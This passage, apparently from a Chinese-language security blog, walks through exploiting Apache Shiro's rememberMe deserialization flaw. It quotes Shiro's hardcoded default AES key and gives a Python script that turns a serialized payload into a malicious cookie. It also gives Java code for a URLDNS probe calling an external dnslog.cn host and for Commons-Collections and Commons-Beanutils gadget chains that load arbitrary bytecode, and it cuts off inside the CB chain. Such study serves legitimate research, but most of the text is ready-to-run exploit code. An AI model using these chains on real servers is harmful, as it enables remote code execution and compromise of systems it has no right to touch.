<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">getDecryptionCipherKey</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> decryptionCipherKey;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setDecryptionCipherKey</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decryptionCipherKey) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">decryptionCipherKey</span> <span style="color:#f92672">=</span> decryptionCipherKey;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setCipherKey</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> cipherKey) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//Since this method should only be used in symmetric ciphers</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//(where the enc and dec keys are the same), set it on both:</span>
</span></span><span style="display:flex;"><span>        setEncryptionCipherKey(cipherKey);
</span></span><span style="display:flex;"><span>        setDecryptionCipherKey(cipherKey);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">AbstractRememberMeManager</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">serializer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> DefaultSerializer<span style="color:#f92672">&lt;</span>PrincipalCollection<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cipherService</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AesCipherService();
</span></span><span style="display:flex;"><span>        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">DefaultBlockCipherService</span>(String algorithmName) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>(algorithmName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">modeName</span> <span style="color:#f92672">=</span> OperationMode.<span style="color:#a6e22e">CBC</span>.<span style="color:#a6e22e">name</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">paddingSchemeName</span> <span style="color:#f92672">=</span> PaddingScheme.<span style="color:#a6e22e">PKCS5</span>.<span style="color:#a6e22e">getTransformationName</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">blockSize</span> <span style="color:#f92672">=</span> DEFAULT_BLOCK_SIZE; <span style="color:#75715e">//0 = use the JCA provider&#39;s default</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">streamingModeName</span> <span style="color:#f92672">=</span> OperationMode.<span style="color:#a6e22e">CBC</span>.<span style="color:#a6e22e">name</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">streamingPaddingSchemeName</span> <span style="color:#f92672">=</span> PaddingScheme.<span style="color:#a6e22e">PKCS5</span>.<span style="color:#a6e22e">getTransformationName</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">streamingBlockSize</span> <span style="color:#f92672">=</span> DEFAULT_STREAMING_BLOCK_SIZE;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> ByteSource <span style="color:#a6e22e">decrypt</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> ciphertext, <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> key) <span style="color:#66d9ef">throws</span> CryptoException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> encrypted <span style="color:#f92672">=</span> ciphertext;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//No IV, check if we need to read the IV from the stream:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> iv <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isGenerateInitializationVectors(<span style="color:#66d9ef">false</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//is:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// - the first N bytes is the initialization vector, where N equals the value of the</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// &#39;initializationVectorSize&#39; attribute.</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//the IV to decrypt the real ciphertext:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> ivSize <span style="color:#f92672">=</span> getInitializationVectorSize();
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> ivByteSize <span style="color:#f92672">=</span> ivSize <span style="color:#f92672">/</span> BITS_PER_BYTE;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//now we know how large the iv is, so extract the iv bytes:</span>
</span></span><span style="display:flex;"><span>                iv <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>ivByteSize<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">arraycopy</span>(ciphertext, 0, iv, 0, ivByteSize);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//remaining data is the actual encrypted ciphertext.  Isolate it:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> encryptedSize <span style="color:#f92672">=</span> ciphertext.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> ivByteSize;
</span></span><span style="display:flex;"><span>                encrypted <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>encryptedSize<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">arraycopy</span>(ciphertext, ivByteSize, encrypted, 0, encryptedSize);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>                String msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Unable to correctly extract the Initialization Vector or ciphertext.&#34;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> CryptoException(msg, e);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> decrypt(encrypted, key, iv);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> DEFAULT_CIPHER_KEY_BYTES <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>);
</span></span></code></pre></div><p>可以分析出解密过程：<code>base64decode -&gt; AESdecode -&gt; deserialize</code>，key为base64编码的<code>kPH+bIxk5D2deZiIxcaaaA==</code>，iv是密文开头内容所以不用设置，填充方式为<code>PKCS5</code>，生成恶意Cookie的exp：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;ser.bin&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BS <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>block_size
</span></span><span style="display:flex;"><span>pad <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: s <span style="color:#f92672">+</span> ((BS <span style="color:#f92672">-</span> len(s) <span style="color:#f92672">%</span> BS) <span style="color:#f92672">*</span> chr(BS <span style="color:#f92672">-</span> len(s) <span style="color:#f92672">%</span> BS))<span style="color:#f92672">.</span>encode()  <span style="color:#75715e"># PKCS5</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>
</span></span><span style="display:flex;"><span>mode <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>MODE_CBC
</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> uuid<span style="color:#f92672">.</span>uuid4()<span style="color:#f92672">.</span>bytes
</span></span><span style="display:flex;"><span>encryptor <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(base64<span style="color:#f92672">.</span>b64decode(key), mode, iv)
</span></span><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(iv <span style="color:#f92672">+</span> encryptor<span style="color:#f92672">.</span>encrypt(pad(data)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(ciphertext)
</span></span></code></pre></div><h2 id="urldns">URLDNS<a hidden class="anchor" aria-hidden="true" href="#urldns">#</a></h2>
<p>URLDNS所需依赖都是java内置类，URLDNS.java：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">serialize</span>(Object obj) <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;ser.bin&#34;</span>));
</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(obj);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">&gt;</span> hashmap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://d0otgz.dnslog.cn&#34;</span>);
</span></span><span style="display:flex;"><span>        Field hashcode <span style="color:#f92672">=</span> url.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
</span></span><span style="display:flex;"><span>        hashcode.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        hashcode.<span style="color:#a6e22e">set</span>(url, 114514);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        hashmap.<span style="color:#a6e22e">put</span>(url, 1);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        hashcode.<span style="color:#a6e22e">set</span>(url, <span style="color:#f92672">-</span>1);
</span></span><span style="display:flex;"><span>        serialize(hashmap);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/Shiro/1.png"></p>
<h2 id="cc">CC<a hidden class="anchor" aria-hidden="true" href="#cc">#</a></h2>
<p>由于shiro中不能加载数组类，所以需要拼接CC3,CC2,CC6：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileInputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.BeanComparator;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.PropertyUtils;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// CC3</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templatesImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        Field _nameField <span style="color:#f92672">=</span> templatesImpl.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
</span></span><span style="display:flex;"><span>        _nameField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        _nameField.<span style="color:#a6e22e">set</span>(templatesImpl, <span style="color:#e6db74">&#34;sxc&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Field _bytecodesField <span style="color:#f92672">=</span> templatesImpl.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
</span></span><span style="display:flex;"><span>        _bytecodesField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytecode <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;path\\to\\Calc.class&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> bytecodes <span style="color:#f92672">=</span> {bytecode};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        _bytecodesField.<span style="color:#a6e22e">set</span>(templatesImpl, bytecodes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// CC2</span>
</span></span><span style="display:flex;"><span>        InvokerTransformer invokerTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;newTransformer&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// CC6</span>
</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> hashmap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> lazymap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(hashmap, (<span style="color:#66d9ef">new</span> ConstantTransformer(<span style="color:#e6db74">&#34;1&#34;</span>)));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazymap, templatesImpl);
</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> hm <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
</span></span><span style="display:flex;"><span>        hm.<span style="color:#a6e22e">put</span>(tiedMapEntry, <span style="color:#e6db74">&#34;258&#34;</span>);
</span></span><span style="display:flex;"><span>        lazymap.<span style="color:#a6e22e">remove</span>(templatesImpl);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Class clazz <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">class</span>;
</span></span><span style="display:flex;"><span>        Field factoryField <span style="color:#f92672">=</span> clazz.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;factory&#34;</span>);
</span></span><span style="display:flex;"><span>        factoryField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        factoryField.<span style="color:#a6e22e">set</span>(lazymap, invokerTransformer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        serialize(hm);
</span></span><span style="display:flex;"><span>        unserialize(<span style="color:#e6db74">&#34;ser.bin&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">serialize</span>(Object obj) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;ser.bin&#34;</span>));
</span></span><span style="display:flex;"><span>            oos.<span style="color:#a6e22e">writeObject</span>(obj);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">unserialize</span>(String Filename) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(Filename));
</span></span><span style="display:flex;"><span>        Object obj <span style="color:#f92672">=</span> ois.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> obj;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="cb">CB<a hidden class="anchor" aria-hidden="true" href="#cb">#</a></h2>
<p>CB链：<code>PriorityQueue.readObject -&gt; BeanComparator.compare -&gt; PropertyUtils.getProperty(TemplatesImpl, &quot;outputProperties&quot;) -&gt; TemplatesImpl.getOutputProperties -&gt; defineTransletClasses.defineClass -&gt; getTransletInstance中调用newInstance()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.Transformer;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InvokerTransformer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileInputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.BeanComparator;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.PropertyUtils;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CB</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        TemplatesImpl templatesImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        Field _nameField <span style="color:#f92672">=</span> templatesImpl.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
</span></span><span style="display:flex;"><span>        _nameField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        _nameField.<span style="color:#a6e22e">set</span>(templatesImpl, <span style="color:#e6db74">&#34;sxc&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Field _bytecodesField <span style="color:#f92672">=</span> templatesImpl.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
</span></span><span style="display:flex;"><span>        _bytecodesField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytecode <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;path\\to\\Calc.class&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> bytecodes <span style="color:#f92672">=</span> {bytecode};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        _bytecodesField.<span style="color:#a6e22e">set</span>(templatesImpl, bytecodes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//        PropertyUtils.getProperty(templatesImpl, &#34;outputProperties&#34;);</span>
</span></span><span style="display:flex;"><span>        BeanComparator beanComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">&#34;outputProperties&#34;</span>, <span style="color:#66d9ef">new</span> AttrCompare());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TransformingComparator transformingComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(<span style="color:#66d9ef">new</span> ConstantTransformer(1));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        PriorityQueue priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue(transformingComparator);
</span></span><span style="display:flex;"><span>        priorityQueue.<span style="color:#a6e22e">add</span>(templatesImpl);
</span></span><span style="display:flex;"><span>        priorityQueue.<span style="color:#a6e22e">add</span>(2);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Field comparatorField <span style="color:#f92672">=</span> priorityQueue.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;comparator&#34;</span>);
</span></span><span style="display:flex;"><span>        comparatorField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        comparatorField.<span style="color:#a6e22e">set</span>(priorityQueue, beanComparator);
</span></span><span style="display:flex;"><span>
